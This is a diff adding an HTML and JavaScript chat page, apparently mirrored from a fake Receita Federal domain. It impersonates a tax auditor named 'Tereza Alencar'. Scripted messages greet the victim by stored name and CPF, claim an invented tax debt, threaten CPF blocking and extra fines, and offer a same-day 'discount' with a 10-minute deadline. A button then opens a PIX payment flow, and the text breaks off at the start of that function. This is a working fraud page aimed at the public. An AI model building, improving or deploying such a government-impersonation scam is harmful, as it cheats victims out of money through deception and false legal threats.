@@ -1,0 +1,2085 @@
+<!DOCTYPE html><html lang="pt-BR"><!-- Mirrored from receita.canalgovbr.org/chat by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Aug 2025 02:45:20 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat - Serviço de consulta</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- QR Code Generator -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+    <!-- CDN Fonts - Rawline -->
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Rawline', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    
+<style>
+    :root {
+        --receita-blue: #044785;
+        --receita-success: #28a745;
+        --receita-danger: #dc3545;
+    }
+
+    @keyframes slideDown {
+        0% { 
+            transform: translateY(-100%);
+            opacity: 0;
+        }
+        100% { 
+            transform: translateY(0);
+            opacity: 1;
+        }
+    }
+    
+    @keyframes fadeIn {
+        0% { opacity: 0; }
+        100% { opacity: 1; }
+    }
+
+    body {
+        font-family: 'Rawline', sans-serif;
+        background-color: #fff;
+        color: #333;
+        line-height: 1.6;
+    }
+
+    .chat-container {
+        overflow-y: auto;
+        padding: 10px 20px;
+        scroll-behavior: smooth;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .chat-container::-webkit-scrollbar {
+        width: 6px;
+    }
+
+    .chat-container::-webkit-scrollbar-track {
+        background: #f1f1f1;
+    }
+
+    .chat-container::-webkit-scrollbar-thumb {
+        background: #c9c9c9;
+        border-radius: 10px;
+    }
+
+    .message-bubble {
+        margin-bottom: 16px;
+        max-width: 75%;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .incoming-message {
+        align-self: flex-start;
+        margin-right: auto;
+        padding-left: 0px;
+        margin-left: -10px;
+    }
+
+    .outgoing-message {
+        align-self: flex-end;
+        margin-left: auto;
+        align-items: flex-end;
+        padding-right: 0px;
+        margin-right: -10px;
+    }
+
+    .message-content {
+        padding: 14px 18px;
+        border-radius: 18px;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        margin-top: 4px;
+        position: relative;
+        line-height: 1.5;
+    }
+
+    .incoming-message .message-content {
+        background-color: #044785;
+        border-top-left-radius: 2px;
+        text-align: left;
+        color: white;
+        min-width: 200px;
+    }
+
+    .outgoing-message .message-content {
+        background-color: #d4d4d4;
+        border-top-right-radius: 2px;
+        text-align: right;
+        border-right: 2px solid #999;
+    }
+
+    .chat-avatar {
+        width: 46px;
+        height: 46px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid var(--receita-blue);
+        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+
+    .status-indicator {
+        position: absolute;
+        bottom: 0;
+        right: 0;
+        width: 14px;
+        height: 14px;
+        border-radius: 50%;
+        background-color: var(--receita-success);
+        border: 2px solid white;
+    }
+
+    .chat-options {
+        margin-top: 10px;
+        margin-bottom: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        padding-left: 0px;
+        margin-left: -10px;
+        max-width: 75%;
+    }
+
+    .option-button {
+        background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
+        border: 1px solid #d0d0d0;
+        border-radius: 2px;
+        padding: 16px 20px;
+        text-align: left;
+        transition: all 0.2s ease;
+        cursor: pointer;
+        font-weight: 500;
+        box-shadow: 
+            0 4px 8px rgba(0,0,0,0.1),
+            inset 0 1px 0 rgba(255,255,255,0.5),
+            inset 0 -1px 0 rgba(0,0,0,0.1);
+        font-size: 1.05rem;
+        margin-bottom: 12px;
+        color: #333;
+    }
+
+    .option-button:hover {
+        background: linear-gradient(145deg, #f0f0f0, #ffffff);
+        border-color: var(--receita-blue);
+        transform: translateY(-2px);
+        box-shadow: 
+            0 6px 16px rgba(0,0,0,0.15),
+            inset 0 1px 0 rgba(255,255,255,0.7),
+            inset 0 -1px 0 rgba(0,0,0,0.05);
+    }
+
+    .option-button i {
+        font-size: 1.2rem;
+        margin-right: 10px;
+        vertical-align: middle;
+    }
+
+    .avatar-container {
+        position: relative;
+        margin-right: 15px;
+        flex-shrink: 0;
+    }
+
+    .typing-animation {
+        display: flex;
+        align-items: center;
+        column-gap: 5px;
+        height: 15px;
+    }
+
+    .typing-animation .dot {
+        display: block;
+        width: 7px;
+        height: 7px;
+        opacity: 0.8;
+        border-radius: 50%;
+        background-color: white;
+        animation: loadingFade 1s infinite;
+    }
+
+    .typing-animation .dot:nth-child(1) {
+        animation-delay: 0s;
+    }
+
+    .typing-animation .dot:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+
+    .typing-animation .dot:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+
+    @keyframes loadingFade {
+        0% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.2);
+        }
+        100% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+    }
+
+    @media (max-width: 576px) {
+        .message-bubble {
+            max-width: 85%;
+        }
+
+        .chat-container {
+            height: 55vh;
+            padding: 15px;
+        }
+    }
+</style>
+
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:Rawline, sans-serif;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.container{width:100%}@media (min-width: 640px){.container{max-width:640px}}@media (min-width: 768px){.container{max-width:768px}}@media (min-width: 1024px){.container{max-width:1024px}}@media (min-width: 1280px){.container{max-width:1280px}}@media (min-width: 1536px){.container{max-width:1536px}}.mx-auto{margin-left:auto;margin-right:auto}.mr-4{margin-right:1rem}.flex{display:flex}.h-6{height:1.5rem}.h-8{height:2rem}.w-full{width:100%}.max-w-6xl{max-width:72rem}.max-w-7xl{max-width:80rem}.flex-1{flex:1 1 0%}.items-center{align-items:center}.justify-between{justify-content:space-between}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.overflow-hidden{overflow:hidden}.bg-\[\#044785\]{--tw-bg-opacity:1;background-color:rgb(4 71 133 / var(--tw-bg-opacity, 1))}.bg-\[\#222222\]{--tw-bg-opacity:1;background-color:rgb(34 34 34 / var(--tw-bg-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.px-4{padding-left:1rem;padding-right:1rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.text-center{text-align:center}.text-\[10px\]{font-size:10px}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.font-bold{font-weight:700}.font-semibold{font-weight:600}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.hover\:underline:hover{-webkit-text-decoration-line:underline;text-decoration-line:underline}@media (min-width: 768px){.md\:px-8{padding-left:2rem;padding-right:2rem}}</style></head><body>
+    <!-- Script de reload removido para evitar loops -->
+
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1280px-Gov.br_logo.svg.png" alt="gov.br" class="h-8">
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- Receita Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="assets/logo-2.jpg" alt="Gov.br - Receita Federal" class="h-8 mx-auto" onerror="this.style.display='none'">
+        </div>
+    </div>
+    <!-- Attendant Info -->
+    <div class="bg-gray-100 text-gray-800 px-4 md:px-8 py-3">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex items-center w-full">
+                <div class="avatar-container mr-4">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQEVmo673qdom4Jz7BnDYkonHvZ2WRLCY7LzQ&s" class="chat-avatar" alt="Tereza Alencar" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2240%22 fill=%22%23044785%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22 fill=%22white%22%3ETA%3C/text%3E%3C/svg%3E';">
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="flex-1">
+                    <h2 class="header-title text-gray-800 text-lg font-semibold">Tereza Alencar</h2>
+                    <p class="header-subtitle text-gray-600 text-sm">Auditora da Receita Federal</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <main class="container mx-auto px-4 py-2">
+        <div class="max-w-6xl mx-auto">
+            <!-- Chat Body -->
+            <div class="overflow-hidden position-relative">
+                <div class="chat-container" id="chatContainer" style="height: calc(100vh - 200px); min-height: 400px;">
+                    <!-- Messages will be inserted here by JavaScript --></div>
+            </div>
+        </div>
+    </main>
+
+<script>
+// Get customer data from localStorage (saved when accessing via CPF slug)
+let customerData = {};
+try {
+    const dataStr = localStorage.getItem('customerData');
+    if (dataStr) {
+        customerData = JSON.parse(dataStr);
+    }
+} catch (e) {
+    console.error('Erro ao ler customerData do localStorage:', e);
+    customerData = {};
+}
+
+// Função segura para obter dados do cliente
+function getCustomerData() {
+    try {
+        const dataStr = localStorage.getItem('customerData');
+        if (!dataStr) return {};
+        return JSON.parse(dataStr);
+    } catch (e) {
+        console.error('Erro ao ler customerData:', e);
+        return {};
+    }
+}
+
+
+// Function to properly capitalize names
+function capitalizeNames(name) {
+    if (!name || name === 'Cliente' || name === 'Contribuinte') return '';
+    return name.toLowerCase().split(' ').map(word => 
+        word.charAt(0).toUpperCase() + word.slice(1)
+    ).join(' ');
+}
+
+// Function to format CPF: 000.000.000-00
+function formatarCPF(cpf) {
+    if (!cpf) return 'CPF não informado';
+    // Remove all non-numeric characters
+    const cpfLimpo = String(cpf).replace(/\D/g, '');
+    if (cpfLimpo.length !== 11) return cpf; // Return original if invalid length
+    return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+// Function to format phone: (00) 00000-0000 or (00) 0000-0000
+function formatarTelefone(telefone) {
+    if (!telefone) return '';
+    // Remove all non-numeric characters
+    const telLimpo = String(telefone).replace(/\D/g, '');
+    
+    // Remove country code 55 if present
+    let tel = telLimpo;
+    if (telLimpo.length >= 12 && telLimpo.startsWith('55')) {
+        tel = telLimpo.substring(2);
+    }
+    
+    // Format based on length
+    if (tel.length === 11) {
+        // Cell phone: (00) 00000-0000
+        return tel.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+    } else if (tel.length === 10) {
+        // Landline: (00) 0000-0000
+        return tel.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
+    }
+    
+    // Return original if format doesn't match
+    return telefone;
+}
+
+// Verificar se tem dados reais no localStorage
+function getCustomerNameData() {
+    const nome = customerData.nome || customerData.NOME || '';
+    const cpfValue = customerData.cpf || customerData.CPF || '';
+    
+    console.log('📝 Dados do cliente no localStorage:', { nome, cpfValue });
+    
+    // Se nome for genérico, retornar null para buscar depois
+    if (!nome || nome === 'Cliente' || nome === 'Contribuinte' || nome.trim() === '') {
+        console.log('⚠️ Nome genérico encontrado, será buscado na API');
+        return { firstName: null, fullName: null, cpf: cpfValue };
+    }
+    
+    const nomeCapitalizado = capitalizeNames(nome);
+    const firstName = nomeCapitalizado.split(' ')[0];
+    console.log('✅ Nome válido encontrado:', { firstName, fullName: nomeCapitalizado });
+    return { firstName, fullName: nomeCapitalizado, cpf: cpfValue };
+}
+
+const nameData = getCustomerNameData();
+let firstName = nameData.firstName || 'Prezado(a)';
+let fullName = nameData.fullName || '';
+const cpf = nameData.cpf ? formatarCPF(nameData.cpf) : '';
+
+// Variáveis globais para atualizar depois se buscar da API
+window.currentFirstName = firstName;
+window.currentFullName = fullName;
+
+console.log('📝 Variáveis globais iniciais:', { 
+    currentFirstName: window.currentFirstName, 
+    currentFullName: window.currentFullName 
+});
+
+// Chat sequence with tax debt notification
+// Delays aumentados para dar mais tempo de leitura e processamento (5-7 segundos)
+const chatSequence = [
+    {
+            message: `Olá ${window.currentFirstName || 'Prezado(a)'}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
+            delay: 5000 // 5s - mensagem de apresentação e boas-vindas
+        },
+    {
+            message: window.currentFullName 
+                ? `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${window.currentFullName}.`
+                : `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em seu nome.`,
+            delay: 6000, // 6s - primeira mensagem importante, precisa de tempo para ler e processar
+            requestPhone: true
+        },
+        {
+            message: `${window.currentFirstName || 'Prezado(a)'}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
+            delay: 6500 // 6.5s - mensagem de urgência, precisa de tempo para impacto e reflexão
+        },
+        {
+            message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 948,92 ao seu CPF, conforme determina a legislação tributária federal.`,
+            delay: 6500 // 6.5s - reforço de urgência, tempo para processar a informação
+        },
+        {
+            message: `Importante: realizando o pagamento hoje (${new Date().toLocaleDateString("pt-BR")}) há um desconto de 62%, reduzindo o débito de R$ 419,55 para apenas R$ 68,93. ${window.currentFirstName || 'Prezado(a)'}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
+            delay: 7000, // 7s - mensagem de oferta, precisa de tempo para processar e tomar decisão
+            showOptions: 'debtOptions'
+        }
+    ];
+
+// Chat container
+const chatContainer = document.getElementById('chatContainer');
+if (!chatContainer) {
+    console.error('❌ chatContainer não encontrado!');
+}
+
+// Add message to chat
+function addMessage(text, isIncoming = true, scrollToBottom = true) {
+    try {
+        if (!chatContainer) {
+            console.error('❌ chatContainer não encontrado em addMessage');
+            return;
+        }
+        
+        if (!text) {
+            console.warn('⚠️ Tentativa de adicionar mensagem vazia');
+            return;
+        }
+        
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;
+    
+    messageDiv.innerHTML = `
+        <div class="message-content">
+                ${String(text).replace(/\n/g, '<br>')}
+        </div>
+    `;
+    
+    chatContainer.appendChild(messageDiv);
+    
+    if (scrollToBottom) {
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+        }
+    } catch (error) {
+        console.error('❌ Erro ao adicionar mensagem:', error);
+    }
+}
+
+// Show typing indicator - ULTRA SIMPLIFICADO e sempre resolve rapidamente
+function showTyping(duration = 1500) {
+    return new Promise(resolve => {
+        // Garantir que sempre resolve rapidamente
+        let resolved = false;
+        const resolveOnce = () => {
+            if (!resolved) {
+                resolved = true;
+                resolve();
+            }
+        };
+        
+        // Timeout de segurança MUITO mais curto - máximo 3 segundos total
+        const maxDuration = Math.min(duration + 500, 3000);
+        const safetyTimeout = setTimeout(() => {
+            console.log(`⏰ showTyping: timeout de segurança (${maxDuration}ms)`);
+            resolveOnce();
+        }, maxDuration);
+        
+        try {
+            if (!chatContainer) {
+                console.warn('⚠️ chatContainer não encontrado, resolvendo imediatamente');
+                clearTimeout(safetyTimeout);
+                resolveOnce();
+                return;
+            }
+            
+            // Criar e mostrar typing indicator
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
+        typingDiv.style.paddingLeft = '0px';
+        typingDiv.style.marginLeft = '-10px';
+        typingDiv.innerHTML = `
+            <div class="message-content d-flex align-items-center" style="background-color: #044785; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
+                <div class="typing-animation">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+        `;
+
+        chatContainer.appendChild(typingDiv);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+
+            // Remover após duration (garantir que sempre resolve)
+            const removeTimeout = setTimeout(() => {
+                try {
+                    if (typingDiv && typingDiv.parentNode) {
+                typingDiv.parentNode.removeChild(typingDiv);
+            }
+                } catch (e) {
+                    // Ignorar erro de remoção
+                }
+                clearTimeout(safetyTimeout);
+                resolveOnce();
+            }, Math.min(duration, 2000)); // Máximo 2 segundos para mostrar typing
+            
+        } catch (error) {
+            console.error('❌ Erro ao mostrar typing:', error);
+            clearTimeout(safetyTimeout);
+            resolveOnce(); // Sempre resolve mesmo com erro
+        }
+    });
+}
+
+// Show options
+function showOptions(optionsId) {
+    try {
+        if (!chatContainer) {
+            console.error('❌ chatContainer não encontrado em showOptions');
+            return;
+        }
+        
+    let optionsHtml = '';
+
+    if (optionsId === 'debtOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou quitar o débito agora mesmo', 'redirectToPayment')">
+                    <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
+                    Vou quitar o débito agora mesmo
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Autorizo o bloqueio do meu CPF', 'confirmBlock')">
+                    <i class="fas fa-times-circle" style="color: var(--receita-danger);"></i> 
+                    Autorizo o bloqueio do meu CPF
+                </button>
+            </div>
+        `;
+    }
+
+    if (optionsHtml) {
+        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+        }
+    } catch (error) {
+        console.error('❌ Erro ao mostrar opções:', error);
+    }
+}
+
+// Handle option click - SIMPLIFICADO e robusto
+async function handleOptionClick(button, responseText, nextAction) {
+    console.log('🖱️ Opção clicada:', responseText, 'Ação:', nextAction);
+    
+    try {
+        // Desabilitar botão
+        if (button) {
+            button.disabled = true;
+            button.style.opacity = '0.6';
+            button.style.cursor = 'not-allowed';
+        }
+
+        // Adicionar resposta do usuário
+    addMessage(responseText, false, true);
+
+        // Remover opções
+        const optionsContainer = button ? button.closest('.chat-options') : null;
+    if (optionsContainer) {
+        optionsContainer.remove();
+        }
+    } catch (error) {
+        console.error('❌ Erro ao processar clique:', error);
+    }
+
+    // Aguardar um pouco antes de continuar
+    await new Promise(resolve => setTimeout(resolve, 800));
+
+    // Continuar conversa baseado na ação
+        if (nextAction === 'redirectToPayment') {
+        console.log('💰 Iniciando fluxo de pagamento...');
+        
+        // Função auxiliar para enviar mensagem com typing
+        const enviarComTyping = async (texto, delayTyping = 2000) => {
+            try {
+                await Promise.race([
+                    showTyping(delayTyping),
+                    new Promise(resolve => setTimeout(resolve, delayTyping + 500))
+                ]);
+            } catch (e) {
+                console.warn('Erro no showTyping, continuando...', e);
+            }
+            addMessage(texto, true, true);
+        };
+        
+        // Primeira mensagem
+        await enviarComTyping(
+            `${window.currentFirstName || 'Prezado(a)'}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade após hoje.`,
+            2500
+        );
+        
+        // Pequeno delay entre mensagens
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        // Segunda mensagem
+        await enviarComTyping(
+            'Segundo as normas da Receita Federal, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa de não cumprimento do acordo no valor de R$985,00 e o CPF seguirá na lista de bloqueio.',
+            3000
+        );
+        
+        // Mostrar botão de pagamento após delay
+            setTimeout(() => {
+            console.log('💳 Exibindo botão de pagamento...');
+            try {
+                showPaymentButton();
+                console.log('✅ Botão de pagamento exibido com sucesso');
+            } catch (e) {
+                console.error('❌ Erro ao mostrar botão:', e);
+                // Tentar novamente
+                setTimeout(() => {
+                    try {
+                        showPaymentButton();
+                    } catch (e2) {
+                        console.error('❌ Erro crítico:', e2);
+                    }
+                }, 1000);
+            }
+        }, 1500);
+        
+        } else if (nextAction === 'confirmBlock') {
+        try {
+            await Promise.race([
+                showTyping(3000),
+                new Promise(resolve => setTimeout(resolve, 3500))
+            ]);
+        } catch (e) {
+            console.warn('Erro no showTyping, continuando...', e);
+        }
+            addMessage('Entendido. Vou iniciar o processo de bloqueio do seu CPF conforme os procedimentos da Receita Federal. O bloqueio será efetivado em breve. Obrigada pela atenção.', true, true);
+        }
+}
+
+// Show payment button - com verificação de disponibilidade do sistema de pagamento
+function showPaymentButton() {
+    try {
+        if (!chatContainer) {
+            console.error('❌ chatContainer não encontrado em showPaymentButton');
+            // Tentar novamente após 500ms
+            setTimeout(() => {
+                showPaymentButton();
+            }, 500);
+            return;
+        }
+
+        // Verificar se já existe botão de pagamento
+        const existingButton = document.getElementById('pixPaymentButton');
+        if (existingButton) {
+            console.log('⚠️ Botão de pagamento já existe, não duplicando');
+            return;
+        }
+
+        // Função para tentar abrir o PIX modal
+        const tryOpenPix = () => {
+            if (typeof openPixModal === 'function') {
+                console.log('✅ Abrindo modal PIX...');
+                try {
+                    openPixModal();
+                } catch (e) {
+                    console.error('❌ Erro ao abrir modal PIX:', e);
+                    alert('Erro ao abrir sistema de pagamento. Por favor, recarregue a página e tente novamente.');
+                }
+            } else {
+                console.warn('⚠️ openPixModal não disponível ainda, aguardando...');
+                // Tentar novamente após 1 segundo
+                setTimeout(() => {
+                    if (typeof openPixModal === 'function') {
+                        tryOpenPix();
+                    } else {
+                        alert('Sistema de pagamento ainda carregando... Aguarde alguns instantes e clique novamente.');
+                    }
+                }, 1000);
+            }
+        };
+
+    const buttonHtml = `
+        <div class="payment-button-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+                <button class="payment-button" id="pixPaymentButton" onclick="(function() { if(typeof openPixModal === 'function') { try { openPixModal(); } catch(e) { console.error('Erro:', e); alert('Erro ao abrir pagamento. Recarregue a página.'); } } else { alert('Sistema de pagamento carregando... Aguarde alguns instantes.'); setTimeout(function() { if(typeof openPixModal === 'function') { openPixModal(); } else { alert('Por favor, recarregue a página.'); } }, 2000); } })()" style="
+                background: #28a745;
+                border: none;
+                border-radius: 2px;
+                padding: 16px 24px;
+                color: white;
+                font-weight: 600;
+                font-size: 1.1rem;
+                cursor: pointer;
+                width: 100%;
+                text-align: center;
+                transition: all 0.3s ease;
+                box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+            " onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'" 
+               onmouseout="this.style.background='#28a745'; this.style.transform='translateY(0)'">
+                <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
+                Realizar pagamento
+            </button>
+        </div>
+    `;
+    
+    chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+        
+        console.log('✅ Botão de pagamento adicionado ao chat');
+        
+        // Verificar se openPixModal está disponível e logar status
+        setTimeout(() => {
+            if (typeof openPixModal === 'function') {
+                console.log('✅ openPixModal está disponível e pronto para uso');
+            } else {
+                console.warn('⚠️ openPixModal ainda não está disponível - payment-handler.js pode não ter carregado');
+            }
+        }, 500);
+        
+    } catch (error) {
+        console.error('❌ Erro ao mostrar botão de pagamento:', error);
+        // Tentar novamente após 1 segundo
+        setTimeout(() => {
+            try {
+                showPaymentButton();
+            } catch (e) {
+                console.error('❌ Erro crítico ao mostrar botão de pagamento:', e);
+            }
+        }, 1000);
+    }
+}
+
+// PIX Modal functionality - Integração com Paradise Pags
+async function openPixModal() {
+    console.log('💰 Abrindo modal PIX...');
+    
+    // Verificar se já está gerando PIX
+    if (window.isGeneratingPix) {
+        console.warn('⚠️ PIX já está sendo gerado, aguardando...');
+        return;
+    }
+    
